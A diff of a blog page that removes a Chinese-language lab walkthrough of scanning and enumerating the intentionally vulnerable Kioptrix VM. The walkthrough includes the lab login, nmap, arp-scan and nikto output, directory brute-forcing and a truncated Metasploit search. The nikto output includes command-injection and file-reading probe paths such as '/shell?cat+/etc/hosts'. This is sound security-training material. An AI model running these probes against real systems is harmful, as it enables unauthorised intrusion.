@@ -3104,10 +3104,10 @@
 
 
   
-    <article id="scann-Scanning &amp; Enumeration" class="article article-type-scann" itemscope itemprop="blogPost">
+    <article id="post-SCIST_final" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2024/12/21/Scanning%20&%20Enumeration/" class="article-date">
+      <a href="/2024/12/21/SCIST_final/" class="article-date">
   	<time datetime="2024-12-21T12:32:07.094Z" itemprop="datePublished">2024-12-21</time>
 </a>
     </div>
@@ -3121,8 +3121,8 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2024/12/21/Scanning%20&%20Enumeration/">
-        Scanning &amp; Enumeration
+      <a class="article-title" href="/2024/12/21/SCIST_final/">
+        SCIST Final Exam
         
       </a>
     </h1>
@@ -3133,363 +3133,28 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h1 id="Scanning-amp-Enumeration"><a href="#Scanning-amp-Enumeration" class="headerlink" title="Scanning &amp; Enumeration"></a>Scanning &amp; Enumeration</h1><p><strong>Installing Kioptrix</strong></p>
-<ul>
-<li>Kioptrix Download - <a target="_blank" rel="noopener" href="https://tcm-sec.com/kioptrix">https://tcm-sec.com/kioptrix</a></li>
-<li><a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></li>
-</ul>
-<p>VM</p>
-<p>kali → kali/kali</p>
-<ul>
-<li>ip → 192.168.19.130</li>
-</ul>
-<p>kioptrix → john/TwoCows2</p>
-<hr>
-<h3 id="Scanning-with-Nmap"><a href="#Scanning-with-Nmap" class="headerlink" title="Scanning with Nmap"></a><strong>Scanning with Nmap</strong></h3><ul>
-<li>先確認該機器可以連到網路，VM記得切NAT</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ping 8.8.8.8</span><br></pre></td></tr></table></figure>
-<p><img src="img/scann_Untitled.png" alt="Untitled"></p>
-<p>這台機器無法透過  <code>ifconfig</code> 或 <code>ip a</code> 知道IP，要透過kali去找</p>
-<ul>
-<li>ARP的運作原理<ul>
-<li>在乙太網路上，資料的傳遞必須要有實體位址 (MAC Address)</li>
-<li>Layer 2 設備會驗證 Frame 的實體位址，不是找它的一律捨棄</li>
-<li>設備一開機總不可能就有所有設備的實體位址</li>
-<li>需要 ARP 協定來協助取得各個設備的實體位址</li>
-<li>利用乙太網路的<strong>廣播功能</strong>所設計出來的位址解析協定</li>
-<li>ARP 快取內建立 ARP 表格，查詢的方式來獲得 I P位址 (IP Address) 和實體位址 (MAC Address / Physical Address) 的對應關係</li>
-<li>Layer 3 的設備都一定會有 ARP Cache</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# arp-scan -l        <span class="comment">#使用ARP協定來發現本地網路上的IPv4主機     </span></span><br><span class="line">Interface: eth0, <span class="built_in">type</span>: EN10MB, MAC: 00:0c:29:76:77:35, IPv4: 192.168.19.130</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.19.1    00:50:56:c0:00:08       VMware, Inc.</span><br><span class="line">192.168.19.2    00:50:56:fa:c1:6f       VMware, Inc.</span><br><span class="line">192.168.19.140  00:0c:29:af:92:6a       VMware, Inc.</span><br><span class="line">192.168.19.254  00:50:56:f5:d4:e6       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned <span class="keyword">in</span> 2.747 seconds (93.19 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure>
-<ul>
-<li>到目標kioptrix右鍵點選Setting &gt; Network Adapter <code>NAT</code> &gt; Advanced</li>
-<li>找到目標機器的MAC Address</li>
-</ul>
-<p><img src="img/scann_Untitled_1.png" alt="Untitled"></p>
-<ul>
-<li>根據剛kali掃描結果比對目標的IP位置</li>
-<li>kioptrix → 192.168.19.140  <em>**</em></li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">192.168.19.140  **00:0c:29:af:92:6a**       VMware, Inc.   </span><br></pre></td></tr></table></figure>
-<p>另一種方法可以使用 <code>netdiscover</code></p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# netdiscover -r 192.168.19.0/24</span><br><span class="line"></span><br><span class="line">Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                              </span><br><span class="line">                                                                                                                                                                                            </span><br><span class="line"> 18 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 1080                                                                                                                          </span><br><span class="line"> _____________________________________________________________________________</span><br><span class="line">   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      </span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line"> 192.168.19.1    00:50:56:c0:00:08     11     660  VMware, Inc.                                                                                                                             </span><br><span class="line"> 192.168.19.2    00:50:56:fa:c1:6f      3     180  VMware, Inc.                                                                                                                             </span><br><span class="line"> 192.168.19.139  00:0c:29:b9:88:d6      2     120  VMware, Inc.                                                                                                                             </span><br><span class="line"> 192.168.19.140  00:0c:29:af:92:6a      1      60  VMware, Inc.                                                                                                                             </span><br><span class="line"> 192.168.19.254  00:50:56:f5:d4:e6      1      60  VMware, Inc.</span><br></pre></td></tr></table></figure>
-<p>現在知道了對方IP，要對該IP進行掃描</p>
-<p>掃描開放的Port、服務..</p>
-<ul>
-<li><p>使用Nmap</p>
-<ul>
-<li><p><a target="_blank" rel="noopener" href="https://blog.gtwang.org/linux/nmap-command-examples-tutorials/">常見參數</a></p>
-<ul>
-<li><code>-A</code> 偵測主機的作業系統與各種服務的版本</li>
-<li><code>-O</code> 作業系統資訊</li>
-<li><code>-sV</code> 只需要各種服務版本</li>
-<li><code>-sA</code> 偵測主機是否啟用防火牆</li>
-<li><code>-PN</code> 防火牆保護下的主機</li>
-<li><code>-sP</code> 偵測有開機的主機</li>
-<li><code>-F</code> 加快掃描速度</li>
-<li><code>-T4</code> 比默認速度更快的掃描速度<ul>
-<li>以更快的速度發送掃描請求和處理回應</li>
-<li>可能增加被偵測到的風險</li>
-</ul>
-</li>
-<li><code>-T5</code> 加快掃描速度<ul>
-<li>最快的掃描速度級別</li>
-<li>增加網路負載和被偵測到的風險</li>
-<li>可能導致被目標網路的防火牆或入侵偵測系統封鎖或觸發警報</li>
-</ul>
-</li>
-<li><code>-p</code> 掃描連接PORT</li>
-<li><code>-p-</code> 掃描所有可能的端口(1~65535範圍內)</li>
-<li><code>-sL</code> 查詢網域中所有主機名稱</li>
-<li><code>-v</code> 更詳細輸出</li>
-<li><code>-Pn</code> 不會進行主機發現，而是直接對指定的目標主機進行連接埠掃描。</li>
-<li><p><code>-sS</code> 指定一種掃描技術，即 TCP SYN 掃描（也稱為半開放掃描或 Stealth 掃描）</p>
-<ul>
-<li>SYN &gt; SYNACK &gt; ACK</li>
-<li>主機回應一個SYN/ACK 套件 &gt; 連接埠開放</li>
-<li>主機回應一個RST 套件 &gt; 連接埠是關閉的</li>
-<li>目標主機沒有回應 &gt; 連接埠是過濾的或防火牆封鎖了掃描</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# **nmap -T4 -A -p-** 192.168.19.140</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 10:31 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.19.140</span><br><span class="line">Host is up (0.0014s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE     VERSION</span><br><span class="line">**22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)**</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:<span class="built_in">df</span>:5e:6f:64:86 (RSA1)</span><br><span class="line">|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</span><br><span class="line">|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</span><br><span class="line">|_sshv1: Server supports SSHv1</span><br><span class="line">**80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b)**</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-title: Test Page for the Apache Web Server on Red Hat Linux</span><br><span class="line">|_http-server-header: Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b</span><br><span class="line">**<span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span> (RPC #<span class="number">100000</span>)**</span><br><span class="line">| rpcinfo: </span><br><span class="line">|   program version    port/proto  service</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>            <span class="number">111</span>/tcp   rpcbind</span><br><span class="line">|   <span class="number">100000</span>  <span class="number">2</span>            <span class="number">111</span>/udp   rpcbind</span><br><span class="line">|   <span class="number">100024</span>  <span class="number">1</span>          <span class="number">32768</span>/tcp   status</span><br><span class="line">|_  <span class="number">100024</span>  <span class="number">1</span>          <span class="number">32768</span>/udp   status</span><br><span class="line">**<span class="number">139</span>/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)**</span><br><span class="line">**<span class="number">443</span>/tcp   open  ssl/https   Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b**</span><br><span class="line">|_http-server-header: Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b</span><br><span class="line">|_ssl-date: <span class="number">2024</span>-<span class="number">02</span>-<span class="number">14</span>T04:<span class="number">31</span>:<span class="number">42</span>+<span class="number">00</span>:<span class="number">00</span>; +<span class="number">13</span>h00m04s from scanner time.</span><br><span class="line">| sslv2: </span><br><span class="line">|   SSLv2 supported</span><br><span class="line">|   ciphers: </span><br><span class="line">|     SSL2_DES_192_EDE3_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_128_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_WITH_MD5</span><br><span class="line">|     SSL2_RC4_64_WITH_MD5</span><br><span class="line">|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</span><br><span class="line">|     SSL2_DES_64_CBC_WITH_MD5</span><br><span class="line">|_    SSL2_RC4_128_WITH_MD5</span><br><span class="line">|_http-title: <span class="number">400</span> Bad Request</span><br><span class="line">| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--</span><br><span class="line">| Not valid before: <span class="number">2009</span>-<span class="number">09</span>-<span class="number">26</span>T09:<span class="number">32</span>:<span class="number">06</span></span><br><span class="line">|_Not valid after:  <span class="number">2010</span>-<span class="number">09</span>-<span class="number">26</span>T09:<span class="number">32</span>:<span class="number">06</span></span><br><span class="line">**<span class="number">32768</span>/tcp open  status      <span class="number">1</span> (RPC #<span class="number">100024</span>)**</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:AF:<span class="number">92</span>:<span class="number">6</span>A (VMware)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux <span class="number">2.4</span>.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:<span class="number">2.4</span></span><br><span class="line">OS details: Linux <span class="number">2.4</span>.<span class="number">9</span> - <span class="number">2.4</span>.<span class="number">18</span> (likely embedded)</span><br><span class="line">Network Distance: <span class="number">1</span> hop</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-time: Protocol negotiation failed (SMB2)</span><br><span class="line">|_clock-skew: <span class="number">13</span>h00m03s</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.42</span> ms <span class="number">192.168</span>.<span class="number">19.140</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned in <span class="number">33.45</span> seconds</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>查看開啟服務及版本並蒐集重要資訊</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">**22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b)</span><br><span class="line"><span class="number">111</span>/tcp   open  rpcbind     <span class="number">2</span> (RPC #<span class="number">100000</span>)</span><br><span class="line"><span class="number">139</span>/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line"><span class="number">443</span>/tcp   open  ssl/https   Apache/<span class="number">1.3</span>.<span class="number">20</span> (Unix)  (Red-Hat/Linux) mod_ssl/<span class="number">2.8</span>.<span class="number">4</span> OpenSSL/<span class="number">0.9</span>.<span class="number">6</span>b**</span><br><span class="line">**<span class="number">32768</span>/tcp open  status      <span class="number">1</span> (RPC #<span class="number">100024</span>)**</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><code>22/tcp</code></p>
-<ul>
-<li>SSH服務的預設端口，用於遠端安全存取</li>
-<li>服務版本為OpenSSH 2.9p2，使用的是協定版本1.99</li>
-</ul>
-</li>
-<li><code>80/tcp</code><ul>
-<li><strong>HTTP服務的預設端口</strong>，用於提供Web服務</li>
-<li>主機正在執行一個HTTP伺服器，用於提供網站服務</li>
-<li>服務版本為Apache httpd 1.3.20，使用的是Unix系統（可能是Red Hat或Linux）上的Apache HTTP伺服器</li>
-<li>安裝了mod_ssl模組（版本為2.8.4）</li>
-<li>使用的是OpenSSL函式庫（版本為0.9.6b）來提供安全連線</li>
-</ul>
-</li>
-<li><code>111/tcp</code><ul>
-<li>RPC綁定服務的預設端口，用於遠端過程調用（Remote Procedure Call, RPC）</li>
-<li>允許客戶端遠端呼叫註冊的RPC程式</li>
-</ul>
-</li>
-<li><code>139/tcp</code><ul>
-<li>NetBIOS會話服務的預設端口，用於共用檔案和印表機</li>
-<li>工作小組名稱為MYGROUP</li>
-</ul>
-</li>
-<li><code>443/tcp</code><ul>
-<li><strong>HTTPS服務的預設端口</strong>，用於提供安全的Web服務</li>
-<li>服務版本為Apache/1.3.20，使用的是Unix系統（可能是Red Hat或Linux）上的Apache HTTP伺服器</li>
-<li>安裝了mod_ssl模組（版本為2.8.4）</li>
-<li>使用的是OpenSSL函式庫（版本為0.9.6b）來提供安全連線。</li>
-</ul>
-</li>
-<li><code>32768/tcp</code><ul>
-<li>這是狀態服務的預設端口，通常用於提供服務狀態資訊</li>
-<li>該主機正在執行一個服務，它提供有關係統狀態的信息，通常是一個RPC（Remote Procedure Call，遠端過程呼叫）服務，服務編號為100024</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Enumerating-HTTP-and-HTTPS"><a href="#Enumerating-HTTP-and-HTTPS" class="headerlink" title="Enumerating HTTP and HTTPS"></a><strong>Enumerating HTTP and HTTPS</strong></h3><p>因為有看到80/443 port 開啟，可以先訪問該網站</p>
-<p><img src="img/scann_Untitled_2.png" alt="HTTP"></p>
-<p>HTTP</p>
-<p><img src="img/scann_Untitled_3.png" alt="HTTPS"></p>
-<p>HTTPS</p>
-<p>默認網頁</p>
-<ul>
-<li>幕後運行的架構</li>
-<li>客戶端潛在的訊息及狀況</li>
-<li>該網頁後是否還有其他目錄/網頁..</li>
-</ul>
-<p>可以隨手紀錄攻擊時間、目標IP、發現情況..</p>
-<p><img src="img/scann_Untitled_4.png" alt="Untitled"></p>
-<ul>
-<li><p>nikto 網路掃描器</p>
-<ul>
-<li><p>對http/https進行掃描</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nikto -h https://192.168.19.140</span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 0 host(s) tested</span><br><span class="line">                                                                                                               </span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ nikto -h http://192.168.19.140 </span><br><span class="line">- Nikto v2.5.0</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.19.140</span><br><span class="line">+ Target Hostname:    192.168.19.140</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2024-02-13 14:16:15 (GMT-5)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) **mod_ssl/2.8.4 OpenSSL/0.9.6b**</span><br><span class="line">+ /: Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418</span><br><span class="line">+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options</span><br><span class="line">+ /: The X-Content-Type-Options header is not <span class="built_in">set</span>. This could allow the user agent to render the content of the site <span class="keyword">in</span> a different fashion to the MIME <span class="built_in">type</span>. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/</span><br><span class="line">+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL <span class="keyword">for</span> the 2.x branch.</span><br><span class="line">+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.9.6) (may depend on server version).</span><br><span class="line">+ OpenSSL/0.9.6b appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current <span class="keyword">for</span> the 1.x branch and will be supported <span class="keyword">until</span> Nov 11 2023.</span><br><span class="line">+ /: Apache is vulnerable to XSS via the Expect header. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3918</span><br><span class="line">+ Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible code execution.</span><br><span class="line">+ Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a <span class="built_in">local</span> buffer overflow <span class="built_in">which</span> allows attackers to <span class="built_in">kill</span> any process on the system.</span><br><span class="line">+ Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to overflows <span class="keyword">in</span> mod_rewrite and mod_cgi.</span><br><span class="line">**+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow <span class="built_in">which</span> may allow a remote shell.**</span><br><span class="line">+ OPTIONS: Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE .</span><br><span class="line">+ /: HTTP TRACE method is active <span class="built_in">which</span> suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing</span><br><span class="line">+ ///etc/hosts: The server install allows reading of any system file by adding an extra <span class="string">&#x27;/&#x27;</span> to the URL.</span><br><span class="line">+ /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS). See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2001-0835</span><br><span class="line">+ /manual/: Directory indexing found.</span><br><span class="line">+ /manual/: Web server manual found.</span><br><span class="line">+ /icons/: Directory indexing found.</span><br><span class="line">+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/</span><br><span class="line">+ /test.php: This might be interesting.</span><br><span class="line">+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpress/wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpress/wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /wordpress/wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</span><br><span class="line">+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</span><br><span class="line">+ /login.cgi?cli=aa_aa%27cat_/etc/hosts: Some D-Link router remote <span class="built_in">command</span> execution.</span><br><span class="line">+ /shell?<span class="built_in">cat</span>+/etc/hosts: A backdoor was identified.</span><br><span class="line">+ /#wp-config.php#: <span class="comment">#wp-config.php# file found. This file contains the credentials.</span></span><br><span class="line">+ 8908 requests: 0 error(s) and 30 item(s) reported on remote host</span><br><span class="line">+ End Time:           2024-02-13 14:16:44 (GMT-5) (29 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-<li><p>這邊看到<strong>mod_ssl/2.8.4可以進行遠程利用</strong></p>
-</li>
-</ul>
-<p>接下來進行目錄爆破，尋找可能存在於網頁下的目錄</p>
-<p>Tools</p>
-<ul>
-<li>gobuster</li>
-<li><p>dirbuster/dirb</p>
-<p>  <img src="img/scann_Untitled_5.png" alt="Untitled"></p>
-<ul>
-<li>File extension 可以根據伺服器情況進行修改</li>
-<li>常見網頁伺服器會出現的檔案類型</li>
-<li>常見網頁伺服器檔案類型</li>
-</ul>
-<ol>
-<li>Apache HTTP伺服器：<ul>
-<li><strong><code>.html</code></strong> - HTML網頁文件</li>
-<li><strong><code>.htm</code></strong> - HTML網頁文件</li>
-<li><strong><code>.php</code></strong> - PHP腳本文件</li>
-<li><strong><code>.css</code></strong> - 層疊樣式表文件</li>
-<li><strong><code>.js</code></strong> - JavaScript文件</li>
-<li><strong><code>.jpg</code></strong> - JPEG圖像文件</li>
-<li><strong><code>.jpeg</code></strong> - JPEG圖像文件</li>
-<li><strong><code>.png</code></strong> - PNG圖像文件</li>
-<li><strong><code>.gif</code></strong> - GIF圖像文件</li>
-<li><strong><code>.pdf</code></strong> - PDF文檔文件</li>
-<li><strong><code>.txt</code></strong> - 文本文件</li>
-</ul>
-</li>
-<li><p>Microsoft的Internet Information Server（IIS）：</p>
-<ul>
-<li><strong><code>.html</code></strong></li>
-<li><strong><code>.htm</code></strong></li>
-<li><strong><code>.asp</code></strong> - Active Server Pages</li>
-<li><strong><code>.aspx</code></strong> - ASP.NET頁面</li>
-<li><strong><code>.css</code></strong></li>
-<li><strong><code>.js</code></strong></li>
-<li><strong><code>.jpg</code></strong></li>
-<li><strong><code>.jpeg</code></strong></li>
-<li><strong><code>.png</code></strong></li>
-<li><strong><code>.gif</code></strong></li>
-<li><strong><code>.pdf</code></strong></li>
-<li><strong><code>.txt</code></strong></li>
-</ul>
-</li>
-<li><p>Google的Google Web Server：</p>
-<ul>
-<li><strong><code>.html</code></strong></li>
-<li><strong><code>.htm</code></strong></li>
-<li><strong><code>.css</code></strong></li>
-<li><strong><code>.js</code></strong></li>
-<li><strong><code>.jpg</code></strong></li>
-<li><strong><code>.jpeg</code></strong></li>
-<li><strong><code>.png</code></strong></li>
-<li><strong><code>.gif</code></strong></li>
-<li><strong><code>.pdf</code></strong></li>
-<li><strong><code>.txt</code></strong></li>
-</ul>
-</li>
-<li>nginx公司的nginx：<ul>
-<li><strong><code>.html</code></strong></li>
-<li><strong><code>.htm</code></strong></li>
-<li><strong><code>.css</code></strong></li>
-<li><strong><code>.js</code></strong></li>
-<li><strong><code>.jpg</code></strong></li>
-<li><strong><code>.jpeg</code></strong></li>
-<li><strong><code>.png</code></strong></li>
-<li><strong><code>.gif</code></strong></li>
-<li><strong><code>.pdf</code></strong></li>
-<li><strong><code>.txt</code></strong></li>
-</ul>
-</li>
-<li>lighttpd公司的lighttpd：<ul>
-<li><strong><code>.html</code></strong></li>
-<li><strong><code>.htm</code></strong></li>
-<li><strong><code>.css</code></strong></li>
-<li><strong><code>.js</code></strong></li>
-<li><strong><code>.jpg</code></strong></li>
-<li><strong><code>.jpeg</code></strong></li>
-<li><strong><code>.png</code></strong></li>
-<li><strong><code>.gif</code></strong></li>
-<li><strong><code>.pdf</code></strong></li>
-<li><strong><code>.txt</code></strong></li>
-</ul>
-</li>
-</ol>
-<ul>
-<li><p>可以在此處查看找到的目錄下的檔案</p>
-<p>  <img src="img/scann_Untitled_6.png" alt="Untitled"></p>
-<ul>
-<li><p>看到Response Code</p>
-<ul>
-<li>200/403/300/500…</li>
-<li><p>開啟查看有趣的頁面發現敏感訊息</p>
-<p>  <img src="img/scann_Untitled_7.png" alt="Untitled"></p>
-</li>
-<li><p>查看網頁內容 &gt; 紀錄有用的資訊</p>
-<p><img src="img/scann_Untitled_8.png" alt="Untitled"></p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>通過查看網頁源碼，可能可以發現一些敏感訊息在其中</p>
-<p>  <img src="img/scann_Untitled_9.png" alt="Untitled"></p>
-</li>
-<li><p>Repeater 可以即時回應送出的請求，或是修改發送內容</p>
-<p>  <img src="img/scann_Untitled_10.png" alt="Untitled"></p>
-</li>
-<li><p>限制搜索範圍</p>
-<p>  <img src="img/scann_Untitled_11.png" alt="Untitled"></p>
-</li>
-<li><p>訊息披露</p>
-  <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br></pre></td></tr></table></figure>
-<p>  <img src="img/scann_Untitled_12.png" alt="Untitled"></p>
-</li>
-<li><p>紀錄並整理有用資訊</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">80/443-192.168.19.140·13:52pm</span><br><span class="line">Default webpage Apache PHP</span><br><span class="line">+ Server: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line"></span><br><span class="line">Information Disclosure </span><br><span class="line"></span><br><span class="line">http://192.168.19.140/usage/usage_202402.html - Webalizer Version 2.01</span><br><span class="line"></span><br><span class="line">vuln:</span><br><span class="line">+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow <span class="built_in">which</span> may allow a remote shell.</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-</li>
-</ul>
-<h3 id="Enumerating-SMB"><a href="#Enumerating-SMB" class="headerlink" title="Enumerating SMB"></a><strong>Enumerating SMB</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Question: My enum4linux and/or smbclient are not working. I am receiving <span class="string">&quot;Protocol negotiation failed: NT_STATUS_IO_TIMEOUT&quot;</span>. How <span class="keyword">do</span> I resolve?</span><br><span class="line"></span><br><span class="line">Resolution:</span><br><span class="line"></span><br><span class="line">On Kali, edit /etc/samba/smb.conf</span><br><span class="line"></span><br><span class="line">Add the following under global:</span><br><span class="line"></span><br><span class="line">client min protocol = CORE</span><br><span class="line"></span><br><span class="line">client max protocol = SMB3</span><br></pre></td></tr></table></figure>
-<ul>
-<li>file share</li>
-</ul>
-<p>前面通過nmap掃到了SMB的服務是開啟的狀態</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)</span><br><span class="line">....</span><br><span class="line">Host script results:</span><br><span class="line">|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</span><br><span class="line">|_smb2-<span class="keyword">time</span>: Protocol negotiation failed (SMB2)</span><br><span class="line">|_clock-skew: 13h00m03s</span><br></pre></td></tr></table></figure>
-<p>但這邊沒有透漏很多關於SMB的訊息，最重要的是如果能知道SMB的版本號，會透漏更多目標可能可以利用的資訊</p>
-<ul>
-<li><p>msfconsole exploitation framework</p>
-<ul>
-<li>端口掃描、訊息蒐集、攻擊….</li>
-<li><p>找到符合當前需求的模塊進行訊息蒐集</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 &gt; search SMB</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#    Name                                                               Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -    ----                                                               ---------------  ----       -----  -----------</span><br><span class="line">   0    exploit/multi/http/struts_code_exec_classloader                    2014-03-06       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution</span><br><span class="line">   1    exploit/osx/browser/safari_file_policy                             2011-10-12       normal     No     Apple Safari file:// Arbitrary Code Execution</span><br><span class="line">   2    auxiliary/server/capture/smb                                                        normal 